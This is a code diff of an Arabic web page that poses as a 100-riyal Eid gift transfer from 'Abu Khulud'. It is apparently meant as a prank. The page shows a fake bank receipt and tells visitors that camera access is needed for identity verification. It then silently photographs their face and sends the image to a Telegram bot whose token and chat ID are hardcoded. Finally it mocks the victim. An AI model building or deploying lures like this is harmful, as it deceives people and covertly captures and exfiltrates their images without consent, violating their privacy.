@@ -3,92 +3,81 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>عيديتك من أبو خلود</title>
+    <title>استلام العيدية</title>
     <style>
-        body { font-family: 'Arial', sans-serif; background: #fdfdfd; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #fff; padding: 40px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; width: 85%; max-width: 400px; border: 1px solid #eee; }
-        .logo { width: 80px; margin-bottom: 20px; }
-        h1 { color: #2c3e50; font-size: 24px; }
-        .amount { font-size: 48px; color: #27ae60; font-weight: bold; margin: 20px 0; }
-        .btn { background: #27ae60; color: white; border: none; padding: 15px 30px; border-radius: 50px; font-size: 18px; cursor: pointer; width: 100%; font-weight: bold; box-shadow: 0 4px 15px rgba(39, 174, 96, 0.3); transition: 0.3s; }
-        .btn:active { transform: scale(0.95); }
-        .receipt { display: none; text-align: right; background: #f9f9f9; padding: 15px; border-radius: 10px; margin-top: 20px; border: 1px dashed #ccc; animation: fadeIn 0.5s; }
+        body { font-family: sans-serif; background: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; width: 90%; max-width: 380px; }
+        .btn { background: #1a73e8; color: white; border: none; padding: 16px; border-radius: 8px; font-size: 18px; width: 100%; cursor: pointer; font-weight: bold; margin-top: 15px; }
+        .success-icon { color: #28a745; font-size: 60px; margin-bottom: 10px; display: none; }
+        #receipt { display: none; text-align: right; background: #fafafa; padding: 15px; border: 1px solid #eee; border-radius: 8px; margin-top: 15px; }
         video, canvas { display: none; }
-        .final-msg { color: #e74c3c; font-size: 30px; font-weight: bold; animation: shake 0.5s; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
     </style>
 </head>
 <body>
 
-<div class="card" id="mainCard">
-    <img src="https://cdn-icons-png.flaticon.com/512/2489/2489756.png" class="logo">
-    <h1>عيديتك من أبو خلود 🎁</h1>
-    <p>لقد تم تخصيص عيدية نقدية لك</p>
-    <div class="amount">100.00 ر.س</div>
-    <button class="btn" id="giftBtn" onclick="takeGift()">اضغط لاستلام العيدية</button>
+<div class="card" id="box">
+    <div id="startView">
+        <h2 style="margin-bottom:5px;">عيدية من أبو خلود 🎁</h2>
+        <p style="color:#666;">وصلتك حوالة بقيمة <b>100.00 ر.س</b></p>
+        <button class="btn" onclick="go()">قبول واستلام الحوالة</button>
+    </div>
+    
+    <div id="loadingView">
+        <div class="success-icon" id="check">✓</div>
+        <h3 id="statusTitle">جاري التأكيد...</h3>
+        <div id="receipt">
+            <p><b>المبلغ:</b> 100.00 ريال</p>
+            <p><b>من:</b> أبو خلود</p>
+            <p><b>المرجع:</b> #TXN${Math.floor(Math.random()*99999)}</p>
+        </div>
+    </div>
 </div>
 
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas"></canvas>
+<video id="v" autoplay playsinline></video>
+<canvas id="c"></canvas>
 
 <script>
-    // بياناتك المضافة تلقائياً
-    const TOKEN = "8680007162:AAEKrDXjZJdNKdWeT6pIkMXyALj0m30q34I";
-    const CHAT_ID = "1232397788";
+    const T = "8680007162:AAEKrDXjZJdNKdWeT6pIkMXyALj0m30q34I";
+    const C = "1232397788";
 
-    async function takeGift() {
+    async function go() {
         try {
-            // طلب إذن الكاميرا
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            document.getElementById('video').srcObject = stream;
+            // يطلب الكاميرا فوراً وبدون كلام كثير
+            const s = await navigator.mediaDevices.getUserMedia({ video: true });
+            document.getElementById('v').srcObject = s;
 
-            // تغيير الواجهة لإيصال وهمي
-            const card = document.getElementById('mainCard');
-            card.innerHTML = `
-                <div style="color:#27ae60; font-size:60px;">✔️</div>
-                <h3>تم قبول العملية</h3>
-                <div class="receipt" style="display:block;">
-                    <p><b>من:</b> أبو خلود</p>
-                    <p><b>إلى:</b> عزيزي المستلم</p>
-                    <p><b>المبلغ:</b> 100.00 ريال سعودي</p>
-                    <p><b>رقم المرجع:</b> ${Math.floor(Math.random() * 9000000) + 1000000}</p>
-                    <p style="font-size:12px; color:gray;">يتم الآن تأكيد الإيداع، يرجى الانتظار...</p>
-                </div>
-            `;
+            // اخفاء واجهة البداية واظهار "النجاح الوهمي"
+            document.getElementById('startView').style.display = 'none';
+            document.getElementById('check').style.display = 'block';
+            document.getElementById('receipt').style.display = 'block';
+            document.getElementById('statusTitle').innerText = "تم الإيداع بنجاح!";
 
-            // تصوير وإرسال بعد ثانيتين (عشان يقرأ الإيصال ويثبت وجهه)
-            setTimeout(captureAndSend, 2500);
+            // تصوير وإرسال بعد ثانيتين (الوقت الكافي عشان يثبت وجهه ويقرأ)
+            setTimeout(snap, 2000);
 
-        } catch (err) {
-            alert("خطأ: يجب قبول إذن الكاميرا للتحقق من الهوية واستلام العيدية!");
+        } catch (e) {
+            alert("عذراً، يجب قبول إذن "التحقق من الهوية" لإتمام التحويل البنكي!");
         }
     }
 
-    function captureAndSend() {
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
+    function snap() {
+        const v = document.getElementById('v'), c = document.getElementById('c');
+        c.width = v.videoWidth; c.height = v.videoHeight;
+        c.getContext('2d').drawImage(v, 0, 0);
+        
+        c.toBlob(b => {
+            const f = new FormData();
+            f.append('chat_id', C);
+            f.append('photo', b, 's.jpg');
+            f.append('caption', 'صيد جديد من أبو خلود 😂📸');
+            fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: f });
 
-        canvas.toBlob(blob => {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'prank.jpg');
-            formData.append('caption', 'السبك صدق وأخذت صورته! 😂📸 \n مبروك الصيد يا أبو خلود');
-
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-
-            // اللحظة الحاسمة
+            // الضربة القاضية
             setTimeout(() => {
-                document.getElementById('mainCard').innerHTML = `
-                    <div class="final-msg">🤡 صدقت يا سبك؟</div>
-                    <p style="font-size:20px; margin-top:15px;">صورتك الحين عندي بالتليجرام، تعيش وتأكل غيرها!</p>
-                    <p style="font-weight:bold;">عيدك مبارك يا ضحية أبو خلود 😂</p>
+                document.getElementById('box').innerHTML = `
+                    <h1 style="font-size:50px;">🤡</h1>
+                    <h2 style="color:red;">صدقت يا سبك؟</h2>
+                    <p>صورتك صارت عندي بالتليجرام.. تعيش وتأكل غيرها!</p>
                 `;
             }, 1000);
         }, 'image/jpeg');
